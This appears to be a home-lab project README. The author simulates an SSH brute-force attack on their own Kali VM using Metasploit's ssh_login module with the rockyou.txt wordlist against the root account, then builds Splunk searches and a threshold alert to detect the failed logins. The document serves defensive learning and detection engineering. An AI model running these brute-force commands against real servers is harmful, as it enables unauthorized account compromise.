# cybersecurity-project-101
In this project, I simulated a real-world SSH brute-force attack inside a controlled lab environment (Kali Linux VM) and built a detection pipeline using Splunk Enterprise. The goal was to understand how attackers attempt to gain unauthorized access via SSH, and how a SOC analyst would detect and alert on this behavior using a SIEM tool.
Tools & Technologies
 
| Tool | Purpose |
|------|---------|
| Kali Linux (VirtualBox VM) | Attack and monitoring environment |
| Metasploit Framework (MSF) | Simulating the SSH brute-force attack |
| Splunk Enterprise 10.2.1 | SIEM — ingesting, searching, and alerting on logs |
| auth.log | Linux authentication log file — source of SSH events |
| rockyou.txt | Wordlist used for password brute-forcing |

 
Metasploit and Hydra are capable of SSH brute-force attacks but I chose Metasploit because:
 
- It is an industry-standard penetration testing framework** used by professional red teamers and pentesters worldwide
- The `auxiliary/scanner/ssh/ssh_login` module is purpose-built for credential testing
- Metasploit provides a structured, modular approach — making it easier to document, reproduce, and expand into more complex attack chains in future projects
- It integrates well with a full pentest workflow (scan → exploit → post-exploitation)
 
> Hydra is faster for pure brute-force tasks, but Metasploit offers a more realistic simulation of how a professional attacker would operate.

 Lab Setup
 
### Environment
- Host Machine: macOS (Apple Silicon)
- Virtualization: Oracle VirtualBox
- Guest VM: Kali Linux (vboxkali) — 50GB disk, 4GB RAM, 2 CPUs
- Network: NAT (IP: 10.0.2.15)
 
### Prerequisites
- Kali Linux VM installed and running
- Splunk Enterprise installed at `/opt/splunk`
- SSH service enabled on Kali (`sshd` running on port 22)
- `rockyou.txt` wordlist available at `/usr/share/wordlists/rockyou.txt`

 Step 1 — Start Splunk
```bash
# Start Splunk as root (required for lab environment)
sudo /opt/splunk/bin/splunk start --run-as-root
 
# Splunk web UI will be available at:
# http://localhost:8000
```
 
### Step 2 — Configure Splunk to Monitor auth.log
```bash
# Tell Splunk to watch the Linux authentication log file
# auth.log records all login attempts, sudo usage, and SSH events
# -index main → store events in the main index
# -sourcetype linux_secure → label the data type for easy searching
"sudo /opt/splunk/bin/splunk add monitor /var/log/auth.log -index main -sourcetype linux_secure --run-as-root"
```
 
### Step 3 — Verify SSH is Running on Kali
```bash
# Enable SSH to start automatically on boot
sudo systemctl enable ssh
 
# Start the SSH service
sudo systemctl start ssh
 
# Confirm SSH is active and listening on port 22
sudo systemctl status ssh
 
# Expected output:
# Active: active (running)
# Server listening on 0.0.0.0 port 22
```
 
>  I choose Port 22 because is the default SSH port. Attackers specifically target this port when scanning for remote access entry points.
 
### Step 4 — Get the Target IP Address
```bash
# Display network interfaces and IP addresses
ip a
 
# Look for eth0 interface → inet address
# In our lab: 10.0.2.15 (NAT network assigned by VirtualBox)
```
 
### Step 5 — Launch Metasploit and Configure the Attack
```bash
# Launch the Metasploit Framework console as root
sudo msfconsole
 
# Load the SSH login brute-force module
# This module tries username/password combinations against an SSH server
use auxiliary/scanner/ssh/ssh_login
 
# Set the target IP address (our Kali VM)
set RHOSTS 10.0.2.15
 
# Set the username to attack
# We target 'root' because it's a high-value account attackers always try
set USERNAME root
 
# Set the password wordlist
# rockyou.txt contains 14+ million real-world leaked passwords
set PASS_FILE /usr/share/wordlists/rockyou.txt
 
# Show each attempt in the terminal (useful for monitoring)
set VERBOSE true
 
# Use 10 parallel threads to speed up the attack
set THREADS 10
 
# Launch the brute-force attack
run
``` 
### Step 6 — Verify Logs in Splunk
 
After the attack runs, open `http://localhost:8000` in the Kali browser and run this search:
 
```splunk
# Basic search — find all failed SSH password attempts
index=main sourcetype=linux_secure "Failed password"
```
 
```splunk
# Advanced search — extract the attacker's IP and count attempts
# rex → uses regex to extract the source IP from the log line
# stats count by src_ip → groups and counts events per IP address
index=main sourcetype=linux_secure "Failed password" | rex "from (?P<src_ip>\d+\.\d+\.\d+\.\d+)" | stats count by src_ip
```
 
**Result:** Splunk detected **31+ failed SSH login attempts** from `10.0.2.15` — the simulated attacker IP.
 
### Step 7 — Create a Threshold-Based Alert
 
In Splunk, I created an automated alert that triggers when brute-force activity is detected:
 
| Setting | Value |
|---------|-------|
| **Alert Name** | SSH Brute-Force Detection |
| **Description** | Detects multiple failed SSH login attempts from the same IP |
| **Search Query** | `index=main sourcetype=linux_secure "Failed password" \| rex "from (?P<src_ip>\d+\.\d+\.\d+\.\d+)" \| stats count by src_ip` |
| **Alert Type** | Scheduled — Hourly |
| **Trigger Condition** | Number of Results > 5 |
| **Action** | Log Event |
 
> I adopted a threshold of 5 because a single failed login is normal (mistyped password). Five or more failed attempts from the same IP in a short window is a strong indicator of automated brute-force activity.
 
---
 
##Results
 
- Splunk successfully ingested SSH authentication logs from `auth.log`
- Metasploit generated realistic brute-force traffic (31+ failed attempts)
- Splunk search accurately identified the attacker IP and attempt count
- Threshold-based alert configured to fire when attempts exceed 5
- Alert is enabled and running on an hourly schedule
 
---
 
##Key Learnings
 
- How SSH brute-force attacks work at a technical level
- How `auth.log` captures authentication events in Linux
- How to use Splunk's `rex` command to extract fields from raw log data
- How SOC analysts build threshold-based detection rules in a SIEM
- The difference between Metasploit and Hydra for brute-force simulation
- How to tune alert thresholds to reduce false positives

---
 
## Author
 
**Renzo Sanchez**  
Cybersecurity enthusiast building a home lab to develop real-world SOC and penetration testing skills.
 
---
 
*This project was completed in a controlled lab environment for educational purposes only.*
 
